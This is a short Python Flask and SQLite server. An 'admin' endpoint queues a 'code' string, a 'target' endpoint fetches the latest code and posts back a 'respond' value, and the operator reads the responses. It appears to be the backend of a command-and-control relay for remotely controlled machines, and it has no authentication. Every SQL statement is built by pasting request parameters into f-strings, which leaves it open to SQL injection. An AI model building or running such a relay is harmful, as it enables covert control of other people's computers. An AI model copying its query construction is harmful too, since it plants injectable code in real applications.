
import sqlite3
from flask import Flask, request

#--=--=--=Database--=--=--=
con = sqlite3.connect('data.db',check_same_thread=False)
cur = con.cursor()

def f(fetched):
	f1 = fetched[0]
	f2 = f1[0]
	return f2
def last_id(table):
	cur.execute(f"SELECT id FROM {table};")
	con.commit()
	rows = cur.fetchall()
	lrow = rows[len(rows)-1]
	return lrow[0]
def insert(table,values):
	cur.execute(f'INSERT INTO {table} VALUES({values});')
	con.commit()
	return '0'
def select(table,what,where):
	cur.execute(f'SELECT {what} FROM {table} {where}')
	con.commit()
	return cur.fetchall()
#--=--=--=--=--=--=--=--=--
#--=--=--=-Flask--=--=--=--
app = Flask(__name__)

@app.route('/')
def index():
	return ''
@app.route('/target', methods=['GET'])
def target():
	id = int(request.args['id'])
	res = str(request.args['respond'])
	values = f'{id},"{res}"'
	return insert('responds',values)
@app.route('/gmecde', methods=['GET'])
def gmecde():
	lidofrqs = int(last_id('requests'))
	code = str(f(select('requests','request_code',f'where id = {lidofrqs}')))
	return code+"*"+str(lidofrqs)
@app.route('/admin', methods=['GET'])
def admin():
	code = request.args['code']
	id = int(last_id('requests')) + 1
	values = f'{id},"{code}"'
	return insert('requests', values)
@app.route('/gmeres',methods=['GET'])
def gmeres():
	id = last_id('responds')
	return str(f(select(f'responds','respond',f'where id = {id}')))
#--=--=--=--=--=--=--=--=--


if __name__ == "__main__":
	app.run()
